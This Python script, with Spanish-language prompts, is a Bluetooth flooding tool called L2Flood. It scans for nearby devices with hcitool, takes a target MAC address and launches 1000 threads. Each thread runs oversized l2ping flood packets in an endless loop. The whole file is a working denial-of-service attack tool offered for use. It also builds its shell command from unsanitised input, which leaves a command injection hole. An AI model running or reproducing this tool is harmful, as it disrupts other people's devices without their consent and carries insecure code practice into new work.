import subprocess
import threading
import colorama
import argparse

def print_rainbow(text):
    rainbow_colors = [
        colorama.Fore.RED,
        colorama.Fore.YELLOW,
        colorama.Fore.GREEN,
        colorama.Fore.CYAN,
        colorama.Fore.BLUE,
        colorama.Fore.MAGENTA
    ]

    for i, char in enumerate(text):
        color = rainbow_colors[i % len(rainbow_colors)]
        print(color + char, end='', flush=True)
    print()

def main():
    colorama.init(autoreset=True)
    
    parser = argparse.ArgumentParser(description="Programa para floodear una direcciÃ³n MAC con l2ping.")
    parser.add_argument('-m', '--mac', type=str, help="DirecciÃ³n MAC a floodear")
    args = parser.parse_args()

    if args.mac:
        mac_address = args.mac
        print(f"Floodeando la direcciÃ³n MAC proporcionada: {mac_address}")
        flood_mac_address(mac_address)
    else:
        print_rainbow("_      ___  ______ _                 _")
        print_rainbow(" | |    |__ \|  ____| |               | |")
        print_rainbow(" | |       ) | |__  | | ___   ___   __| |")
        print_rainbow(" | |      / /|  __| | |/ _ \ / _ \ / _` |")
        print_rainbow(" | |____ / /_| |    | | (_) | (_) | (_| |")
        print_rainbow(" |______|____|_|    |_|\___/ \___/ \__,_|")
        print()

        print("Hola, bienvenido a l2ping.")
        print("Ejecutando hcitool scan...")
        subprocess.run(["hcitool", "scan"])

        mac_address = input("Â¿QuÃ© direcciÃ³n MAC floodeamos?: ")
        flood_mac_address(mac_address)

def flood_mac_address(mac_address):
    print(f"Floodeando la direcciÃ³n MAC: {mac_address}")

    # Definir la funciÃ³n que envÃ­a un paquete l2ping
    def send_l2ping():
        while True:
            l2ping_command = f"l2ping -s 600 -f {mac_address} -c 1"
            subprocess.run(l2ping_command, shell=True)

    # Crear una lista de threads para enviar mÃºltiples paquetes
    threads = []
    for _ in range(1000):
        thread = threading.Thread(target=send_l2ping)
        threads.append(thread)

    # Iniciar los threads
    for thread in threads:
        thread.start()

    # Esperar a que todos los threads terminen
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
